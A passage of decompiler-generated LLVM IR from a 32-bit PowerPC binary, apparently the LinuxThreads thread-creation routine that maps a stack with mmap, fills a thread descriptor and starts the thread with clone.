  %v2_10007aac = sub i32 %v1_10007aa4, %v2_10007aa8
  store i32 %v2_10007aac, i32* %r9.global-to-local, align 4
  %v2_10007ab0 = icmp ult i32 %v2_10007a94, %v2_10007aac
  %v4_10007ab0 = icmp eq i32 %v2_10007a94, %v2_10007aac
  store i1 %v4_10007ab0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10007ab0, label %dec_label_pc_10007abc, label %dec_label_pc_10007ac0

dec_label_pc_10007abc:                            ; preds = %dec_label_pc_10007a9c, %dec_label_pc_10007a8c
  br label %dec_label_pc_10007ac0

dec_label_pc_10007ac0:                            ; preds = %dec_label_pc_10007a9c, %dec_label_pc_10007abc
  %storemerge = phi i32 [ %v2_10007a94, %dec_label_pc_10007abc ], [ %v2_10007aac, %dec_label_pc_10007a9c ]
  store i32 %storemerge, i32* @r31, align 4
  %v3_10007ac8 = load i32, i32* @global_var_1002f074.241, align 4
  %tmp29 = mul i32 %v0_10007acc, -2097152
  %v2_10007ad0 = add i32 %v3_10007a4c, %tmp29
  store i32 306, i32* %r6.global-to-local, align 4
  %v1_10007ad8 = add i32 %v2_10007ad0, 2097152
  store i32 %v1_10007ad8, i32* %r9.global-to-local, align 4
  %v1_10007adc = mul i32 %v3_10007ac8, 4
  store i32 %v1_10007adc, i32* %r4.global-to-local, align 4
  %v2_10007ae0 = sub i32 %v1_10007ad8, %v1_10007adc
  store i32 %v2_10007ae0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  %v1_10007aec = add i32 %v2_10007ad0, 2096672
  store i32 %v1_10007aec, i32* %r28.global-to-local, align 4
  store i32 268466932, i32* @lr, align 4
  %v7_10007af0 = call i32 @mmap(i32 %v2_10007ae0, i32 %v1_10007adc, i32 7, i32 306, i32 -1, i32 0, i32 %v1_10007ad8)
  store i32 %v7_10007af0, i32* %r3.global-to-local, align 4
  %v3_10007af4 = icmp eq i32 %v7_10007af0, -1
  store i1 %v3_10007af4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007af4, label %dec_label_pc_10007ac0.dec_label_pc_10007b44_crit_edge, label %dec_label_pc_10007afc

dec_label_pc_10007ac0.dec_label_pc_10007b44_crit_edge: ; preds = %dec_label_pc_10007ac0
  %v0_10007b44.pre = load i32, i32* %r24.global-to-local, align 4
  br label %dec_label_pc_10007b44

dec_label_pc_10007afc:                            ; preds = %dec_label_pc_10007ac0
  %v0_10007afc = load i32, i32* @r31, align 4
  %v1_10007afc = load i32, i32* %r29.global-to-local, align 4
  %v4_10007afc = icmp eq i32 %v0_10007afc, %v1_10007afc
  store i1 %v4_10007afc, i1* %cr7_eq.global-to-local, align 1
  %v1_10007b00 = load i32, i32* %r28.global-to-local, align 4
  %v2_10007b00 = sub i32 %v1_10007b00, %v0_10007afc
  store i32 %v2_10007b00, i32* %r9.global-to-local, align 4
  %v1_10007b04 = add i32 %v2_10007b00, 480
  store i32 %v1_10007b04, i32* %r27.global-to-local, align 4
  br i1 %v4_10007afc, label %dec_label_pc_10007b38, label %dec_label_pc_10007b0c

dec_label_pc_10007b0c:                            ; preds = %dec_label_pc_10007afc
  %v0_10007b0c = load i32, i32* @r30, align 4
  %v1_10007b0c = add i32 %v0_10007b0c, 20
  %v2_10007b0c = inttoptr i32 %v1_10007b0c to i32*
  %v3_10007b0c = load i32, i32* %v2_10007b0c, align 4
  store i32 %v3_10007b0c, i32* %r26.global-to-local, align 4
  store i32 16, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_10007b1c = sub i32 %v1_10007b04, %v3_10007b0c
  store i32 %v2_10007b1c, i32* %r25.global-to-local, align 4
  store i32 %v3_10007b0c, i32* %r4.global-to-local, align 4
  store i32 %v2_10007b1c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 268466992, i32* @lr, align 4
  %v7_10007b2c = call i32 @mmap(i32 %v2_10007b1c, i32 %v3_10007b0c, i32 0, i32 16, i32 -1, i32 0, i32 %v2_10007b00)
  store i32 %v7_10007b2c, i32* %r3.global-to-local, align 4
  %v3_10007b30 = icmp eq i32 %v7_10007b2c, -1
  store i1 %v3_10007b30, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007b30, label %dec_label_pc_10007b38, label %dec_label_pc_10007b4c

dec_label_pc_10007b38:                            ; preds = %dec_label_pc_10007b0c, %dec_label_pc_10007afc
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10007b4c

dec_label_pc_10007b44:                            ; preds = %dec_label_pc_10007ac0.dec_label_pc_10007b44_crit_edge, %dec_label_pc_10007a28
  %v0_10007b44 = phi i32 [ %v0_10007b44.pre, %dec_label_pc_10007ac0.dec_label_pc_10007b44_crit_edge ], [ %v0_10007acc, %dec_label_pc_10007a28 ]
  %v1_10007b44 = add i32 %v0_10007b44, 1
  store i32 %v1_10007b44, i32* %r24.global-to-local, align 4
  %v2_10007a20 = icmp ugt i32 %v1_10007b44, 1023
  %v3_10007a20 = icmp eq i32 %v1_10007b44, 1023
  store i1 %v3_10007a20, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10007a20, label %dec_label_pc_10007ddc, label %dec_label_pc_10007a28

dec_label_pc_10007b4c:                            ; preds = %dec_label_pc_10007b0c, %dec_label_pc_10007b38, %dec_label_pc_10007a60
  %v0_10007b4c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10007b4c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v0_10007b4c, i32* @r31, align 4
  store i32 268467040, i32* @lr, align 4
  %v3_10007b5c = call i32 @__GI_memset(i32 %v0_10007b4c, i32 0, i32 480)
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r3.global-to-local, align 4
  %v3_10007b68 = load i32, i32* @global_var_1002f028.308, align 4
  %v3_10007b6c = load i32, i32* @global_var_1002ef70.296, align 4
  %v0_10007b70 = load i32, i32* @r30, align 4
  %v3_10007b70 = icmp eq i32 %v0_10007b70, 0
  store i1 %v3_10007b70, i1* %cr7_eq.global-to-local, align 1
  %v1_10007b78 = add i32 %v3_10007b68, 1024
  store i32 %v1_10007b78, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002abe0.262 to i32), i32* %r8.global-to-local, align 4
  %v0_10007b80 = load i32, i32* %r24.global-to-local, align 4
  %v1_10007b80 = mul i32 %v0_10007b80, 16
  store i32 %v1_10007b80, i32* %r29.global-to-local, align 4
  %v0_10007b84 = load i32, i32* @r31, align 4
  %v1_10007b84 = add i32 %v0_10007b84, 72
  %v1_10007b88 = add i32 %v3_10007b6c, 1
  store i32 %v1_10007b88, i32* %r9.global-to-local, align 4
  store i32 %v1_10007b88, i32* @global_var_1002ef70.296, align 4
  %v2_10007b90 = add i32 %v1_10007b80, ptrtoint (i32* @global_var_1002abe0.262 to i32)
  store i32 %v2_10007b90, i32* @r10, align 4
  store i32 %v1_10007b78, i32* @global_var_1002f028.308, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_10007b9c = add i32 %v0_10007b84, 68
  %v3_10007b9c = inttoptr i32 %v2_10007b9c to i32*
  store i32 %v1_10007b84, i32* %v3_10007b9c, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_10007ba4 = load i32, i32* %r24.global-to-local, align 4
  %v1_10007ba4 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007ba4 = add i32 %v1_10007ba4, %v0_10007ba4
  store i32 %v2_10007ba4, i32* %r28.global-to-local, align 4
  %v0_10007ba8 = load i32, i32* @r31, align 4
  %v1_10007ba8 = add i32 %v0_10007ba8, 80
  store i32 %v1_10007ba8, i32* %r7.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_10007bb0 = load i32, i32* %r6.global-to-local, align 4
  %v1_10007bb0 = trunc i32 %v0_10007bb0 to i8
  %v3_10007bb0 = add i32 %v0_10007ba8, 65
  %v4_10007bb0 = inttoptr i32 %v3_10007bb0 to i8*
  store i8 %v1_10007bb0, i8* %v4_10007bb0, align 1
  %v0_10007bb4 = load i32, i32* %r7.global-to-local, align 4
  %v1_10007bb4 = load i32, i32* @r31, align 4
  %v2_10007bb4 = add i32 %v1_10007bb4, 76
  %v3_10007bb4 = inttoptr i32 %v2_10007bb4 to i32*
  store i32 %v0_10007bb4, i32* %v3_10007bb4, align 4
  %v0_10007bb8 = load i32, i32* %r25.global-to-local, align 4
  %v1_10007bb8 = load i32, i32* @r31, align 4
  %v2_10007bb8 = add i32 %v1_10007bb8, 396
  %v3_10007bb8 = inttoptr i32 %v2_10007bb8 to i32*
  store i32 %v0_10007bb8, i32* %v3_10007bb8, align 4
  %v0_10007bbc = load i32, i32* %r26.global-to-local, align 4
  %v1_10007bbc = load i32, i32* @r31, align 4
  %v2_10007bbc = add i32 %v1_10007bbc, 400
  %v3_10007bbc = inttoptr i32 %v2_10007bbc to i32*
  store i32 %v0_10007bbc, i32* %v3_10007bbc, align 4
  %v0_10007bc0 = load i32, i32* %r28.global-to-local, align 4
  %v1_10007bc0 = load i32, i32* @r31, align 4
  %v2_10007bc0 = add i32 %v1_10007bc0, 16
  %v3_10007bc0 = inttoptr i32 %v2_10007bc0 to i32*
  store i32 %v0_10007bc0, i32* %v3_10007bc0, align 4
  %v0_10007bc4 = load i32, i32* @r10, align 4
  %v1_10007bc4 = load i32, i32* @r31, align 4
  %v2_10007bc4 = add i32 %v1_10007bc4, 28
  %v3_10007bc4 = inttoptr i32 %v2_10007bc4 to i32*
  store i32 %v0_10007bc4, i32* %v3_10007bc4, align 4
  %v0_10007bc8 = load i32, i32* %r6.global-to-local, align 4
  %v1_10007bc8 = trunc i32 %v0_10007bc8 to i8
  %v2_10007bc8 = load i32, i32* @r31, align 4
  %v3_10007bc8 = add i32 %v2_10007bc8, 64
  %v4_10007bc8 = inttoptr i32 %v3_10007bc8 to i8*
  store i8 %v1_10007bc8, i8* %v4_10007bc8, align 1
  %v0_10007bcc = load i32, i32* @r31, align 4
  %v2_10007bcc = add i32 %v0_10007bcc, 404
  %v3_10007bcc = inttoptr i32 %v2_10007bcc to i32*
  store i32 %v0_10007bcc, i32* %v3_10007bcc, align 4
  %v0_10007bd0 = load i32, i32* %r24.global-to-local, align 4
  %v1_10007bd0 = load i32, i32* @r31, align 4
  %v2_10007bd0 = add i32 %v1_10007bd0, 408
  %v3_10007bd0 = inttoptr i32 %v2_10007bd0 to i32*
  store i32 %v0_10007bd0, i32* %v3_10007bd0, align 4
  %v0_10007bd4 = load i32, i32* %r4.global-to-local, align 4
  %v1_10007bd4 = load i32, i32* %r29.global-to-local, align 4
  %v2_10007bd4 = load i32, i32* %r8.global-to-local, align 4
  %v3_10007bd4 = add i32 %v2_10007bd4, %v1_10007bd4
  %v4_10007bd4 = inttoptr i32 %v3_10007bd4 to i32*
  store i32 %v0_10007bd4, i32* %v4_10007bd4, align 4
  %v0_10007bd8 = load i32, i32* %r4.global-to-local, align 4
  %v1_10007bd8 = load i32, i32* @r10, align 4
  %v2_10007bd8 = add i32 %v1_10007bd8, 4
  %v3_10007bd8 = inttoptr i32 %v2_10007bd8 to i32*
  store i32 %v0_10007bd8, i32* %v3_10007bd8, align 4
  %v0_10007bdc = load i32, i32* %r27.global-to-local, align 4
  %v1_10007bdc = load i32, i32* @r10, align 4
  %v2_10007bdc = add i32 %v1_10007bdc, 12
  %v3_10007bdc = inttoptr i32 %v2_10007bdc to i32*
  store i32 %v0_10007bdc, i32* %v3_10007bdc, align 4
  %v0_10007be0 = load i32, i32* @r31, align 4
  %v1_10007be0 = load i32, i32* @r10, align 4
  %v2_10007be0 = add i32 %v1_10007be0, 8
  %v3_10007be0 = inttoptr i32 %v2_10007be0 to i32*
  store i32 %v0_10007be0, i32* %v3_10007be0, align 4
  %v0_10007be4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10007be4 = load i32, i32* @r31, align 4
  %v2_10007be4 = add i32 %v1_10007be4, 228
  %v3_10007be4 = inttoptr i32 %v2_10007be4 to i32*
  store i32 %v0_10007be4, i32* %v3_10007be4, align 4
  %v0_10007be8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10007be8, label %dec_label_pc_10007c4c, label %dec_label_pc_10007bec

dec_label_pc_10007bec:                            ; preds = %dec_label_pc_10007b4c
  %v0_10007bec = load i32, i32* @r30, align 4
  %v1_10007bec = inttoptr i32 %v0_10007bec to i32*
  %v2_10007bec = load i32, i32* %v1_10007bec, align 4
  store i32 %v2_10007bec, i32* %r0.global-to-local, align 4
  %v1_10007bf0 = trunc i32 %v2_10007bec to i8
  %v2_10007bf0 = load i32, i32* @r31, align 4
  %v3_10007bf0 = add i32 %v2_10007bf0, 45
  %v4_10007bf0 = inttoptr i32 %v3_10007bf0 to i8*
  store i8 %v1_10007bf0, i8* %v4_10007bf0, align 1
  %v0_10007bf4 = load i32, i32* @r30, align 4
  %v1_10007bf4 = add i32 %v0_10007bf4, 24
  %v2_10007bf4 = inttoptr i32 %v1_10007bf4 to i32*
  %v3_10007bf4 = load i32, i32* %v2_10007bf4, align 4
  store i32 %v3_10007bf4, i32* %r0.global-to-local, align 4
  %v1_10007bf8 = load i32, i32* @r31, align 4
  %v2_10007bf8 = add i32 %v1_10007bf8, 392
  %v3_10007bf8 = inttoptr i32 %v2_10007bf8 to i32*
  store i32 %v3_10007bf4, i32* %v3_10007bf8, align 4
  %v0_10007bfc = load i32, i32* @r30, align 4
  %v1_10007bfc = add i32 %v0_10007bfc, 12
  %v2_10007bfc = inttoptr i32 %v1_10007bfc to i32*
  %v3_10007bfc = load i32, i32* %v2_10007bfc, align 4
  store i32 %v3_10007bfc, i32* %r0.global-to-local, align 4
  %v3_10007c00 = icmp eq i32 %v3_10007bfc, 0
  store i1 %v3_10007c00, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007c00, label %dec_label_pc_10007c2c, label %dec_label_pc_10007c08

dec_label_pc_10007c08:                            ; preds = %dec_label_pc_10007bec
  %v3_10007c08 = icmp eq i32 %v3_10007bfc, 1
  store i1 %v3_10007c08, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007c08, label %dec_label_pc_10007c10, label %dec_label_pc_10007c44

dec_label_pc_10007c10:                            ; preds = %dec_label_pc_10007c08
  %v1_10007c10 = add i32 %v0_10007bfc, 4
  %v2_10007c10 = inttoptr i32 %v1_10007c10 to i32*
  %v3_10007c10 = load i32, i32* %v2_10007c10, align 4
  store i32 %v3_10007c10, i32* %r0.global-to-local, align 4
  %v0_10007c14 = load i32, i32* @r31, align 4
  %v1_10007c14 = add i32 %v0_10007c14, 232
  store i32 %v1_10007c14, i32* @r3, align 4
  %v1_10007c18 = add i32 %v0_10007bfc, 8
  store i32 %v1_10007c18, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v2_10007c20 = add i32 %v0_10007c14, 228
  %v3_10007c20 = inttoptr i32 %v2_10007c20 to i32*
  store i32 %v3_10007c10, i32* %v3_10007c20, align 4
  store i32 ptrtoint (i32* @global_var_10007c28.309 to i32), i32* @lr, align 4
  %v0_10007c24 = call i32 @memcpy()
  store i32 %v0_10007c24, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007c44

dec_label_pc_10007c2c:                            ; preds = %dec_label_pc_10007bec
  %v0_10007c2c = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10007c2c, i32* %r3.global-to-local, align 4
  store i32 268467252, i32* @lr, align 4
  %v1_10007c30 = call i32 @sched_getscheduler(i32 %v0_10007c2c)
  %v0_10007c34 = load i32, i32* @r31, align 4
  %v1_10007c34 = add i32 %v0_10007c34, 232
  store i32 %v1_10007c34, i32* %r4.global-to-local, align 4
  %v2_10007c38 = add i32 %v0_10007c34, 228
  %v3_10007c38 = inttoptr i32 %v2_10007c38 to i32*
  store i32 %v1_10007c30, i32* %v3_10007c38, align 4
  %v0_10007c3c = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10007c3c, i32* %r3.global-to-local, align 4
  store i32 268467268, i32* @lr, align 4
  %v2_10007c40 = call i32 @sched_getparam(i32 %v0_10007c3c, i32 %v1_10007c34)
  store i32 %v2_10007c40, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007c44

dec_label_pc_10007c44:                            ; preds = %dec_label_pc_10007c08, %dec_label_pc_10007c10, %dec_label_pc_10007c2c
  %v0_10007c44 = load i32, i32* @r31, align 4
  %v1_10007c44 = add i32 %v0_10007c44, 232
  %v2_10007c44 = inttoptr i32 %v1_10007c44 to i32*
  %v3_10007c44 = load i32, i32* %v2_10007c44, align 4
  store i32 %v3_10007c44, i32* %r0.global-to-local, align 4
  %v2_10007c48 = add i32 %v0_10007c44, 24
  %v3_10007c48 = inttoptr i32 %v2_10007c48 to i32*
  store i32 %v3_10007c44, i32* %v3_10007c48, align 4
  br label %dec_label_pc_10007c4c

dec_label_pc_10007c4c:                            ; preds = %dec_label_pc_10007b4c, %dec_label_pc_10007c44
  %v0_10007c4c = load i32, i32* %r20.global-to-local, align 4
  %v1_10007c4c = load i32, i32* @r31, align 4
  %v2_10007c4c = add i32 %v1_10007c4c, 92
  %v3_10007c4c = inttoptr i32 %v2_10007c4c to i32*
  store i32 %v0_10007c4c, i32* %v3_10007c4c, align 4
  store i32 %v2_10007c50, i32* @r4, align 4
  %v0_10007c54 = load i32, i32* %r19.global-to-local, align 4
  %v1_10007c54 = load i32, i32* @r31, align 4
  %v2_10007c54 = add i32 %v1_10007c54, 96
  %v3_10007c54 = inttoptr i32 %v2_10007c54 to i32*
  store i32 %v0_10007c54, i32* %v3_10007c54, align 4
  store i32 128, i32* @r5, align 4
  %v0_10007c5c = load i32, i32* @r31, align 4
  %v1_10007c5c = add i32 %v0_10007c5c, 100
  store i32 %v1_10007c5c, i32* @r3, align 4
  store i32 268467300, i32* @lr, align 4
  %v0_10007c60 = call i32 @memcpy()
  store i32 %v0_10007c60, i32* %r3.global-to-local, align 4
  %v0_10007c64 = load i32, i32* @r31, align 4
  %v1_10007c64 = add i32 %v0_10007c64, 24
  %v2_10007c64 = inttoptr i32 %v1_10007c64 to i32*
  %v3_10007c64 = load i32, i32* %v2_10007c64, align 4
  store i32 %v3_10007c64, i32* %r3.global-to-local, align 4
  store i32 268467308, i32* @lr, align 4
  %v1_10007c68 = call i32 @__pthread_manager_adjust_prio(i32 %v3_10007c64)
  store i32 %v1_10007c68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r11.global-to-local, align 4
  %v3_10007c70 = load i32, i32* @global_var_1002ef30, align 4
  %v0_10007c74 = load i32, i32* %r18.global-to-local, align 4
  %v3_10007c74 = icmp eq i32 %v0_10007c74, 0
  store i1 %v3_10007c74, i1* %cr7_eq.global-to-local, align 1
  %v1_10007c78 = load i32, i32* @r31, align 4
  %v2_10007c78 = add i32 %v1_10007c78, 4
  %v3_10007c78 = inttoptr i32 %v2_10007c78 to i32*
  store i32 %v3_10007c70, i32* %v3_10007c78, align 4
  %v3_10007c7c = load i32, i32* @global_var_1002ef30, align 4
  store i32 %v3_10007c7c, i32* %r0.global-to-local, align 4
  %v1_10007c84 = load i32, i32* @r31, align 4
  %v2_10007c84 = inttoptr i32 %v1_10007c84 to i32*
  store i32 %v3_10007c7c, i32* %v2_10007c84, align 4
  %v3_10007c88 = load i32, i32* @global_var_1002ef30, align 4
  %v0_10007c90 = load i32, i32* @r31, align 4
  %v2_10007c90 = add i32 %v3_10007c88, 4
  %v3_10007c90 = inttoptr i32 %v2_10007c90 to i32*
  store i32 %v0_10007c90, i32* %v3_10007c90, align 4
  %v3_10007c94 = load i32, i32* @global_var_1002ef30, align 4
  store i32 %v3_10007c94, i32* %r9.global-to-local, align 4
  %v0_10007c98 = load i32, i32* @r31, align 4
  %v2_10007c98 = inttoptr i32 %v3_10007c94 to i32*
  store i32 %v0_10007c98, i32* %v2_10007c98, align 4
  br i1 %v3_10007c74, label %dec_label_pc_10007d20, label %dec_label_pc_10007ca0

dec_label_pc_10007ca0:                            ; preds = %dec_label_pc_10007c4c
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10007ca4 = load i32, i32* @global_var_1002f030.246, align 4
  store i32 %v3_10007ca4, i32* %r0.global-to-local, align 4
  %v0_10007ca8 = load i32, i32* %r23.global-to-local, align 4
  %v1_10007ca8 = add i32 %v0_10007ca8, 416
  %v2_10007ca8 = inttoptr i32 %v1_10007ca8 to i32*
  %v3_10007ca8 = load i32, i32* %v2_10007ca8, align 4
  %v2_10007cac = or i32 %v3_10007ca8, %v3_10007ca4
  store i32 %v2_10007cac, i32* %r0.global-to-local, align 4
  %v1_10007cb0 = and i32 %v2_10007cac, 128
  store i32 %v1_10007cb0, i32* %r9.global-to-local, align 4
  %v3_10007cb0 = icmp eq i32 %v1_10007cb0, 0
  br i1 %v3_10007cb0, label %dec_label_pc_10007d20, label %dec_label_pc_10007cb8

dec_label_pc_10007cb8:                            ; preds = %dec_label_pc_10007ca0
  %v0_10007cb8 = load i32, i32* @r31, align 4
  %v1_10007cb8 = add i32 %v0_10007cb8, 28
  %v2_10007cb8 = inttoptr i32 %v1_10007cb8 to i32*
  %v3_10007cb8 = load i32, i32* %v2_10007cb8, align 4
  store i32 %v3_10007cb8, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268467396, i32* @lr, align 4
  %v0_10007cc0 = call i32 @__pthread_lock()
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10007cc8 = load i32, i32* @global_var_1002ef58.229, align 4
  store i32 268465636, i32* %r3.global-to-local, align 4
  %v0_10007cd4 = load i32, i32* @r31, align 4
  store i32 %v0_10007cd4, i32* %r4.global-to-local, align 4
  %v1_10007cd8 = or i32 %v3_10007cc8, 3840
  store i32 %v0_10007cd4, i32* %r6.global-to-local, align 4
  store i32 268467432, i32* @lr, align 4
  %v4_10007ce4 = call i32 @clone(i32 268465636, i32 %v0_10007cd4, i32 %v1_10007cd8, i32 %v0_10007cd4)
  store i32 %v4_10007ce4, i32* @r3, align 4
  %v3_10007ce8 = icmp eq i32 %v4_10007ce4, -1
  store i1 %v3_10007ce8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v4_10007ce4, i32* %r29.global-to-local, align 4
  br i1 %v3_10007ce8, label %dec_label_pc_10007d48.thread, label %dec_label_pc_10007d18

dec_label_pc_10007d48.thread:                     ; preds = %dec_label_pc_10007cb8
  store i1 true, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_10007d50

dec_label_pc_10007d18:                            ; preds = %dec_label_pc_10007cb8
  store i32 8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v1_10007cfc = load i32, i32* @r31, align 4
  %v2_10007cfc = add i32 %v1_10007cfc, 424
  %v3_10007cfc = inttoptr i32 %v2_10007cfc to i32*
  store i32 8, i32* %v3_10007cfc, align 4
  %v0_10007d00 = load i32, i32* @r31, align 4
  %v2_10007d00 = add i32 %v0_10007d00, 428
  %v3_10007d00 = inttoptr i32 %v2_10007d00 to i32*
  store i32 %v0_10007d00, i32* %v3_10007d00, align 4
  %v0_10007d04 = load i32, i32* @r31, align 4
  store i32 %v0_10007d04, i32* @global_var_1002f038.254, align 4
  %v2_10007d08 = add i32 %v0_10007d04, 20
  %v3_10007d08 = inttoptr i32 %v2_10007d08 to i32*
  store i32 %v4_10007ce4, i32* %v3_10007d08, align 4
  %v1_10007d0c = call i32 @__linuxthreads_create_event(i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  store i32 %v1_10007d0c, i32* %r3.global-to-local, align 4
  %v0_10007d10 = load i32, i32* @r31, align 4
  %v1_10007d10 = add i32 %v0_10007d10, 28
  %v2_10007d10 = inttoptr i32 %v1_10007d10 to i32*
  %v3_10007d10 = load i32, i32* %v2_10007d10, align 4
  store i32 %v3_10007d10, i32* @r3, align 4
  store i32 268467480, i32* @lr, align 4
  %v0_10007d14 = call i32 @__pthread_unlock()
  store i32 %v0_10007d14, i32* %r3.global-to-local, align 4
  %v0_10007d18.pr = load i32, i32* %r29.global-to-local, align 4
  %v3_10007d18 = icmp eq i32 %v0_10007d18.pr, 0
  store i1 %v3_10007d18, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007d18, label %dec_label_pc_10007d20, label %dec_label_pc_10007d48

dec_label_pc_10007d20:                            ; preds = %dec_label_pc_10007d18, %dec_label_pc_10007ca0, %dec_label_pc_10007c4c
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10007d28 = load i32, i32* @global_var_1002ef58.229, align 4
  store i32 268465404, i32* %r3.global-to-local, align 4
  %v0_10007d30 = load i32, i32* @r31, align 4
  store i32 %v0_10007d30, i32* %r4.global-to-local, align 4
  store i32 %v0_10007d30, i32* %r6.global-to-local, align 4
  %v1_10007d38 = or i32 %v3_10007d28, 3840
  store i32 268467524, i32* @lr, align 4
  %v4_10007d40 = call i32 @clone(i32 268465404, i32 %v0_10007d30, i32 %v1_10007d38, i32 %v0_10007d30)
  store i32 %v4_10007d40, i32* %r3.global-to-local, align 4
  store i32 %v4_10007d40, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10007d48

dec_label_pc_10007d48:                            ; preds = %dec_label_pc_10007d18, %dec_label_pc_10007d20
  %v0_10007de4 = phi i32 [ %v4_10007d40, %dec_label_pc_10007d20 ], [ %v0_10007d18.pr, %dec_label_pc_10007d18 ]
  %v3_10007d48 = icmp eq i32 %v0_10007de4, -1
  store i1 %v3_10007d48, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007d48, label %dec_label_pc_10007d50, label %dec_label_pc_10007de4

dec_label_pc_10007d50:                            ; preds = %dec_label_pc_10007d48.thread, %dec_label_pc_10007d48
  %v0_10007d50 = load i32, i32* @r31, align 4
  %v1_10007d50 = inttoptr i32 %v0_10007d50 to i32*
  %v2_10007d50 = load i32, i32* %v1_10007d50, align 4
  store i32 %v2_10007d50, i32* %r11.global-to-local, align 4
  %v0_10007d54 = load i32, i32* @r30, align 4
  %v3_10007d54 = icmp eq i32 %v0_10007d54, 0
  store i1 %v3_10007d54, i1* %cr7_eq.global-to-local, align 1
  %v1_10007d58 = add i32 %v0_10007d50, 4
  %v2_10007d58 = inttoptr i32 %v1_10007d58 to i32*
  %v3_10007d58 = load i32, i32* %v2_10007d58, align 4
  store i32 %v3_10007d58, i32* %r0.global-to-local, align 4
  %v2_10007d5c = add i32 %v2_10007d50, 4
  %v3_10007d5c = inttoptr i32 %v2_10007d5c to i32*
  store i32 %v3_10007d58, i32* %v3_10007d5c, align 4
  %v0_10007d60 = load i32, i32* @r31, align 4
  %v1_10007d60 = add i32 %v0_10007d60, 4
  %v2_10007d60 = inttoptr i32 %v1_10007d60 to i32*
  %v3_10007d60 = load i32, i32* %v2_10007d60, align 4
  store i32 %v3_10007d60, i32* %r9.global-to-local, align 4
  %v0_10007d64 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007d64 = inttoptr i32 %v3_10007d60 to i32*
  store i32 %v0_10007d64, i32* %v2_10007d64, align 4
  br i1 %v3_10007d54, label %dec_label_pc_10007d78, label %dec_label_pc_10007d6c

dec_label_pc_10007d6c:                            ; preds = %dec_label_pc_10007d50
  %v0_10007d6c = load i32, i32* @r30, align 4
  %v1_10007d6c = add i32 %v0_10007d6c, 24
  %v2_10007d6c = inttoptr i32 %v1_10007d6c to i32*
  %v3_10007d6c = load i32, i32* %v2_10007d6c, align 4
  store i32 %v3_10007d6c, i32* %r0.global-to-local, align 4
  %v3_10007d70 = icmp eq i32 %v3_10007d6c, 0
  store i1 %v3_10007d70, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007d70, label %dec_label_pc_10007d78, label %dec_label_pc_10007da4

dec_label_pc_10007d78:                            ; preds = %dec_label_pc_10007d6c, %dec_label_pc_10007d50
  %v0_10007d78 = load i32, i32* @r31, align 4
  %v1_10007d78 = add i32 %v0_10007d78, 400
  %v2_10007d78 = inttoptr i32 %v1_10007d78 to i32*
  %v3_10007d78 = load i32, i32* %v2_10007d78, align 4
  store i32 %v3_10007d78, i32* %r4.global-to-local, align 4
  %v3_10007d7c = icmp eq i32 %v3_10007d78, 0
  store i1 %v3_10007d7c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10007d7c, label %dec_label_pc_10007d8c, label %dec_label_pc_10007d84

dec_label_pc_10007d84:                            ; preds = %dec_label_pc_10007d78
  %v1_10007d84 = add i32 %v0_10007d78, 396
  %v2_10007d84 = inttoptr i32 %v1_10007d84 to i32*
  %v3_10007d84 = load i32, i32* %v2_10007d84, align 4
  store i32 %v3_10007d84, i32* %r3.global-to-local, align 4
  store i32 268467596, i32* @lr, align 4
  %v2_10007d88 = call i32 @munmap(i32 %v3_10007d84, i32 %v3_10007d78)
  store i32 %v2_10007d88, i32* %r3.global-to-local, align 4
  %v1_10007d98.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007d8c

dec_label_pc_10007d8c:                            ; preds = %dec_label_pc_10007d78, %dec_label_pc_10007d84
  %v1_10007d98 = phi i32 [ %v0_10007d78, %dec_label_pc_10007d78 ], [ %v1_10007d98.pre, %dec_label_pc_10007d84 ]
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v3_10007d90 = load i32, i32* @global_var_1002f074.241, align 4
